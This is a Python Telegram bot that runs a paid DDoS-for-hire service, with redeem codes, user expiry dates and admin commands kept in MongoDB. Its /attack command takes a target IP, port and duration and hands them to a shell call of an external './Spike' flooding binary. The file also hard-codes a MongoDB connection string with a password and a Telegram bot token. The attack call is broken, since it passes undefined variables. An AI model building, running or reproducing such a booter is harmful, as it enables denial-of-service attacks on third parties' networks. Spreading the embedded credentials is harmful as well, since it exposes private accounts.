
import os
import socket
import subprocess
import asyncio
import pytz
import platform
import random
import string
import logging
import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext, filters, MessageHandler
from pymongo import MongoClient
from datetime import datetime, timedelta, timezone

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Database Configuration
MONGO_URI = 'mongodb+srv://harry:Sachdeva@cluster1.b02ct.mongodb.net/?retryWrites=true&w=majority&appName=Cluster1'
client = MongoClient(MONGO_URI)
db = client['Harvinder']
users_collection = db['shalu']
settings_collection = db['settings']
redeem_codes_collection = db['redeem_code-Harveyy']

# Bot Configuration
TELEGRAM_BOT_TOKEN = '7794130580:AAFppGVaFjofH6aZRaSOoVnerEefoBTPuVk'
ADMIN_USER_ID = 5134043595

# Cooldown dictionary and user attack history
cooldown_dict = {}
user_attack_history = {}

async def help_command(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    if user_id != ADMIN_USER_ID:
        # Help text for regular users (exclude sensitive commands)
        help_text = (
            "*Here are the commands you can use:* \n\n"
            "*🔸 /start* - Start interacting with the bot.\n"
            "*🔸 /attack* - Trigger an attack operation.\n"
            "*🔸 /redeem* - Redeem a code.\n"
        )
    else:
        # Help text for admins (include sensitive commands)
        help_text = (
            "*💡 Available Commands for Admins:*\n\n"
            "*🔸 /start* - Start the bot.\n"
            "*🔸 /attack* - Start the attack.\n"
            "*🔸 /add [user_id]* - Add a user.\n"
            "*🔸 /remove [user_id]* - Remove a user.\n"
            "*🔸 /users* - List all allowed users.\n"
            "*🔸 /gen* - Generate a redeem code.\n"
            "*🔸 /redeem* - Redeem a code.\n"
            "*🔸 /cleanup* - Clean up stored data.\n"
            "*🔸 /delete_code* - Delete a redeem code.\n"
            "*🔸 /list_codes* - List all redeem codes.\n"
            "*🔸 /extend_expiry* - Extend Expiry.\n"
            "*🔸 /broadcast* - Broadcast messsage to all user.\n"
        )
    await context.bot.send_message(chat_id=update.effective_chat.id, text=help_text, parse_mode='Markdown')

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id  # Get the ID of the user

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    message = (
        "*🔥 Welcome to the battlefield! 🔥*\n\n"
        "*Use /attack <ip> <port> <duration>*\n"
        "*Let the war begin! ⚔️💥*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def add_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to add users!*", parse_mode='Markdown')
        return

    if len(context.args) != 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /add <user_id> <days/minutes>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])
    time_input = context.args[1]  # The second argument is the time input (e.g., '2m', '5d')

    # Extract numeric value and unit from the input
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])  # Get all but the last character and convert to int
        total_seconds = time_value * 86400  # Convert days to seconds
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])  # Get all but the last character and convert to int
        total_seconds = time_value * 60  # Convert minutes to seconds
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Please specify time in days (d) or minutes (m).*", parse_mode='Markdown')
        return

    expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)  # Updated to use timezone-aware UTC


    # Add or update user in the database
    users_collection.update_one(
        {"user_id": target_user_id},
        {"$set": {"expiry_date": expiry_date,}},
        upsert=True
    )

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} added with expiry in {time_value} {time_input[-1]}.*", parse_mode='Markdown')

async def remove_user(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to remove users!*", parse_mode='Markdown')
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])

    # Remove user from the database
    users_collection.delete_one({"user_id": target_user_id})

    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ User {target_user_id} removed.*", parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            # Ensure expiry_date is timezone-aware
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            # Compare with the current time
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

# Blocked Ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

async def attack(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    # Check if the user is allowed to use the bot
    if not await is_user_allowed(user_id):
        await context.bot.send_message(chat_id=chat_id, text="*❌ You are not authorized to use this bot!*", parse_mode='Markdown')
        return

    args = context.args
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /attack <ip> <port> <duration>*", parse_mode='Markdown')
        return

    target_ip, target_port, duration = args[0], int(args[1]), args[2]


    # Check if the port is blocked
    if target_port in blocked_ports:
        await context.bot.send_message(chat_id=chat_id, text=f"*❌ Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
        return

    # Cooldown period in seconds
    cooldown_period = 60
    current_time = datetime.now()

    # Check cooldown
    if user_id in cooldown_dict:
        time_diff = (current_time - cooldown_dict[user_id]).total_seconds()
        if time_diff < cooldown_period:
            remaining_time = cooldown_period - int(time_diff)
            await context.bot.send_message(
                chat_id=chat_id,
                text=f"*⏳ You need to wait {remaining_time} seconds before launching another attack!*",
                parse_mode='Markdown'
            )
            return

    # Update the last attack time and record the IP and port
    cooldown_dict[user_id] = current_time
    if user_id not in user_attack_history:
        user_attack_history[user_id] = set()
    user_attack_history[user_id].add((target_ip, target_port))

    # Send attack initiation message
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            f"*⚔️ Attack Launched! ⚔️*\n"
            f"*🎯 Target: {target_ip}:{target_port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*🔥 Let the battlefield ignite! 💥*"
        ),
        parse_mode='Markdown'
    )

    # Launch the attack (dummy function call)
    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    try:
        process = await asyncio.create_subprocess_shell(
            f"./Spike {ip} {port} {duration} 1024 400",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')

    finally:
        await context.bot.send_message(chat_id=chat_id, text="*✅ Attack Completed! ✅*\n*Thank you for using our service!*", parse_mode='Markdown')


async def generate_redeem_code(update, context):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to generate redeem codes!*", 
            parse_mode='Markdown'
        )
        return

    if len(context.args) < 1:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Usage: /gen [custom_code] <days/minutes> [max_uses]*", 
            parse_mode='Markdown'
        )
        return

    # Default values
    max_uses = 1
    custom_code = None

    # Determine if the first argument is a time value or custom code
    time_input = context.args[0]
    if time_input[-1].lower() in ['d', 'm']:
        # First argument is time, generate a random code
        redeem_code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
    else:
        # First argument is custom code
        custom_code = time_input
        time_input = context.args[1] if len(context.args) > 1 else None
        redeem_code = custom_code

    # Check if a time value was provided
    if time_input is None or time_input[-1].lower() not in ['d', 'm']:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
            parse_mode='Markdown'
        )
        return

    # Parse time value and unit
    try:
        time_value = int(time_input[:-1])
        time_unit = time_input[-1].lower()
    except ValueError:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Invalid time format. Use a number followed by 'd' (days) or 'm' (minutes).*",
            parse_mode='Markdown'
        )
        return

    # Set max_uses if provided
    if len(context.args) > (2 if custom_code else 1):
        try:
            max_uses = int(context.args[2] if custom_code else context.args[1])
        except ValueError:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ Please provide a valid number for max uses.*", 
                parse_mode='Markdown'
            )
            return

    # Insert the code into the database without an expiry date yet
    redeem_codes_collection.insert_one({
        "code": redeem_code,
        "time_value": time_value,  # Time duration
        "time_unit": time_unit,  # 'd' for days or 'm' for minutes
        "used_by": [],  # Track user IDs that redeem the code
        "max_uses": max_uses,
        "redeem_count": 0
    })

    # Format the message
    time_label = f"{time_value} {'day(s)' if time_unit == 'd' else 'minute(s)'}"
    message = (
        f"✅ Redeem code generated: `{redeem_code}`\n"
        f"Duration: {time_label}\n"
        f"Max uses: {max_uses}"
    )

    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=message, 
        parse_mode='Markdown'
    )

async def redeem_code(update, context):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /redeem <code>*", parse_mode='Markdown')
        return

    code = context.args[0]
    redeem_entry = redeem_codes_collection.find_one({"code": code})

    if not redeem_entry:
        await context.bot.send_message(chat_id=chat_id, text="*❌ Invalid redeem code.*", parse_mode='Markdown')
        return

    if user_id in redeem_entry['used_by']:
        await context.bot.send_message(chat_id=chat_id, text="*❌ You have already redeemed this code.*", parse_mode='Markdown')
        return

    # Calculate the expiry date based on the time value and unit
    time_value = redeem_entry['time_value']
    time_unit = redeem_entry['time_unit']
    if time_unit == 'd':
        expiry_date = datetime.now(timezone.utc) + timedelta(days=time_value)
    elif time_unit == 'm':
        expiry_date = datetime.now(timezone.utc) + timedelta(minutes=time_value)

    # Update the user's expiry date
    users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"expiry_date": expiry_date}},
        upsert=True
    )

    # Mark the redeem code as used by adding user to `used_by` and increment `redeem_count`
    redeem_codes_collection.update_one(
        {"code": code},
        {"$inc": {"redeem_count": 1}, "$push": {"used_by": user_id}}
    )

    # Check if the redeem code has exceeded its max uses
    if redeem_entry['redeem_count'] + 1 >= redeem_entry['max_uses']:
        redeem_codes_collection.delete_one({"code": code})

    await context.bot.send_message(chat_id=chat_id, text="*✅ Redeem code successfully applied!*\n*You can now use the bot.*", parse_mode='Markdown')
# Function to delete redeem codes based on specified criteria
async def delete_code(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to delete redeem codes!*", 
            parse_mode='Markdown'
        )
        return

    # Check if a specific code is provided as an argument
    if len(context.args) > 0:
        # Get the specific code to delete
        specific_code = context.args[0]

        # Try to delete the specific code, whether expired or not
        result = redeem_codes_collection.delete_one({"code": specific_code})
        
        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*✅ Redeem code `{specific_code}` has been deleted successfully.*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*⚠️ Code `{specific_code}` not found.*", 
                parse_mode='Markdown'
            )
    else:
        # Delete only expired codes if no specific code is provided
        current_time = datetime.now(timezone.utc)
        result = redeem_codes_collection.delete_many({"expiry_date": {"$lt": current_time}})

        if result.deleted_count > 0:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*✅ Deleted {result.deleted_count} expired redeem code(s).*", 
                parse_mode='Markdown'
            )
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text="*⚠️ No expired codes found to delete.*", 
                parse_mode='Markdown'
            )


# Function to list redeem codes
async def list_codes(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    
    # Check if the user is an admin
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*❌ You are not authorized to view redeem codes!*",
            parse_mode='Markdown'
        )
        return

    # Check if there are any documents in the collection
    if redeem_codes_collection.count_documents({}) == 0:
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="*⚠️ No redeem codes found.*",
            parse_mode='Markdown'
        )
        return

    # Retrieve all codes
    codes = redeem_codes_collection.find()
    message = "*🎟️ Active Redeem Codes:*\n"

    current_time = datetime.now(timezone.utc)
    for code in codes:
        try:
            # Safely access code and expiry_date keys
            code_value = code.get('code', 'Unknown')
            expiry_date = code.get('expiry_date')

            if not expiry_date:
                message += f"• Code: `{code_value}`, Status: ⚠️ Missing expiry date\n"
                continue
            
            # Ensure expiry_date is timezone-aware
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)

            # Format expiry date to show only the date (YYYY-MM-DD)
            expiry_date_str = expiry_date.strftime('%Y-%m-%d')

            # Calculate the remaining time
            time_diff = expiry_date - current_time
            remaining_minutes = time_diff.total_seconds() // 60  # Get the remaining time in minutes

            # Avoid showing 0.0 minutes, ensure at least 1 minute is displayed
            remaining_minutes = max(1, remaining_minutes) if remaining_minutes > 0 else 0

            # Display the remaining time in a more human-readable format
            if remaining_minutes >= 1440:  # More than 1 day
                remaining_days = remaining_minutes // 1440  # Days = minutes // 1440
                remaining_hours = (remaining_minutes % 1440) // 60  # Hours = (minutes % 1440) // 60
                remaining_time = f"({remaining_days} days, {remaining_hours} hours)"
            elif remaining_minutes >= 60:  # More than 1 hour
                remaining_hours = remaining_minutes // 60
                remaining_time = f"({remaining_hours} hours)"
            else:  # Less than 1 hour
                remaining_time = f"({int(remaining_minutes)} minutes)"
            
            # Determine whether the code is valid or expired
            if expiry_date > current_time:
                status = "✅"
            else:
                status = "❌"
                remaining_time = "(Expired)"
            
            # Append the code details to the message
            message += f"• Code: `{code_value}`, Expiry: {expiry_date_str} {remaining_time} {status}\n"

        except Exception as e:
            # Log any unexpected issues with the code data
            logging.error(f"Error processing code: {code}, Error: {e}")
            message += f"• Code: `{code.get('code', 'Unknown')}`, Status: ⚠️ Error processing this code\n"

    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=message,
        parse_mode='Markdown'
    )

async def list_users(update, context):
    current_time = datetime.now(timezone.utc)
    users = users_collection.find() 
    
    user_list_message = "👥 User List:\n"
    
    for user in users:
        user_id = user['user_id']
        expiry_date = user['expiry_date']
        if expiry_date.tzinfo is None:
            expiry_date = expiry_date.replace(tzinfo=timezone.utc)
    
        time_remaining = expiry_date - current_time
        if time_remaining.days < 0:
            remaining_days = 0
            remaining_hours = 0
            remaining_minutes = 0
            expired = True  
        else:
            remaining_days = time_remaining.days
            remaining_hours = time_remaining.seconds // 3600
            remaining_minutes = (time_remaining.seconds // 60) % 60
            expired = False 
        
        expiry_label = f"{remaining_days}D-{remaining_hours}H-{remaining_minutes}M"
        status = "🔴 Expired" if expired else "🟢 Active"
        
        user_list_message += f"🔹 *User ID: {user_id} - Expiry: {expiry_label} - Status: {status}*\n"

    await context.bot.send_message(chat_id=update.effective_chat.id, text=user_list_message, parse_mode='Markdown')

async def is_user_allowed(user_id):
    user = users_collection.find_one({"user_id": user_id})
    if user:
        expiry_date = user['expiry_date']
        if expiry_date:
            # Ensure expiry_date is timezone-aware
            if expiry_date.tzinfo is None:
                expiry_date = expiry_date.replace(tzinfo=timezone.utc)
            # Compare with the current time
            if expiry_date > datetime.now(timezone.utc):
                return True
    return False

async def cleanup(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*❌ You are not authorized to perform this action!*", parse_mode='Markdown')
        return

    # Get the current UTC time
    current_time = datetime.now(timezone.utc)

    # Find users with expired expiry_date
    expired_users = users_collection.find({"expiry_date": {"$lt": current_time}})

    expired_users_list = list(expired_users)  # Convert cursor to list

    if len(expired_users_list) == 0:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="*⚠️ No expired users found.*", parse_mode='Markdown')
        return

    # Remove expired users from the database
    for user in expired_users_list:
        users_collection.delete_one({"_id": user["_id"]})

    # Notify admin
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"*✅ Cleanup Complete!*\n*Removed {len(expired_users_list)} expired users.*", parse_mode='Markdown')

# Function to broadcast a message to all users
async def broadcast_message(update: Update, context: CallbackContext):
    user_id = update.effective_user.id

    # Ensure only the admin can use this command
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to broadcast messages!*", 
            parse_mode='Markdown'
        )
        return

    # Ensure a message is provided
    if not context.args:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Usage: /broadcast <message>*", 
            parse_mode='Markdown'
        )
        return

    # Get the broadcast message
    broadcast_message = ' '.join(context.args)

    # Retrieve all user IDs from the database
    users = users_collection.find({}, {"user_id": 1})  # Fetch only the `user_id` field

    success_count = 0
    failure_count = 0

    for user in users:
        try:
            user_id = user['user_id']
            await context.bot.send_message(
                chat_id=user_id, 
                text=f"*📢 Broadcast Message:*\n\n{broadcast_message}", 
                parse_mode='Markdown'
            )
            success_count += 1
        except Exception as e:
            print(f"Failed to send message to user {user_id}: {str(e)}")
            failure_count += 1

    # Send summary to the admin
    await context.bot.send_message(
        chat_id=update.effective_chat.id, 
        text=(
            f"*✅ Broadcast completed!*\n\n"
            f"*📬 Successful:* {success_count}\n"
            f"*⚠️ Failed:* {failure_count}\n"
        ),
        parse_mode='Markdown'
    )

async def extend_expiry(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*❌ You are not authorized to extend expiry dates!*", 
            parse_mode='Markdown'
        )
        return

    if len(context.args) == 0:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Usage: /extend_expiry <user_id (optional)> <days/minutes>*", 
            parse_mode='Markdown'
        )
        return

    time_input = context.args[-1]
    if time_input[-1].lower() == 'd':
        time_value = int(time_input[:-1])
        total_seconds = time_value * 86400  # Convert days to seconds
    elif time_input[-1].lower() == 'm':
        time_value = int(time_input[:-1])
        total_seconds = time_value * 60  # Convert minutes to seconds
    else:
        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text="*⚠️ Please specify time in days (d) or minutes (m).*", 
            parse_mode='Markdown'
        )
        return

    new_expiry_date = datetime.now(timezone.utc) + timedelta(seconds=total_seconds)

    if len(context.args) == 1:
        # No user_id provided, extend for all users
        users_updated = 0
        for user in users_collection.find({"expiry_date": {"$gt": datetime.now(timezone.utc)}}):
            users_collection.update_one(
                {"user_id": user['user_id']},
                {"$set": {"expiry_date": new_expiry_date}}
            )
            users_updated += 1

        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=f"*✅ Expiry dates extended for {users_updated} active users by {time_value} {time_input[-1]}.*", 
            parse_mode='Markdown'
        )

    elif len(context.args) == 2:
        # Specific user ID provided, extend for that user
        target_user_id = int(context.args[0])

        # Check if the user exists in the database
        user = users_collection.find_one({"user_id": target_user_id})
        if not user:
            await context.bot.send_message(
                chat_id=update.effective_chat.id, 
                text=f"*❌ User {target_user_id} not found.*", 
                parse_mode='Markdown'
            )
            return

        users_collection.update_one(
            {"user_id": target_user_id},
            {"$set": {"expiry_date": new_expiry_date}}
        )

        await context.bot.send_message(
            chat_id=update.effective_chat.id, 
            text=f"*✅ Expiry date extended for user {target_user_id} by {time_value} {time_input[-1]}.*", 
            parse_mode='Markdown'
        )





# Add the modified command handler
def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("add", add_user))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("cleanup", cleanup))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("delete_code", delete_code))
    application.add_handler(CommandHandler("list_codes", list_codes))
    application.add_handler(CommandHandler("users", list_users))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("extend_expiry", extend_expiry))
    application.add_handler(CommandHandler("broadcast", broadcast_message))

    # Other handlers remain unchanged
    application.run_polling()

if __name__ == '__main__':
    main()
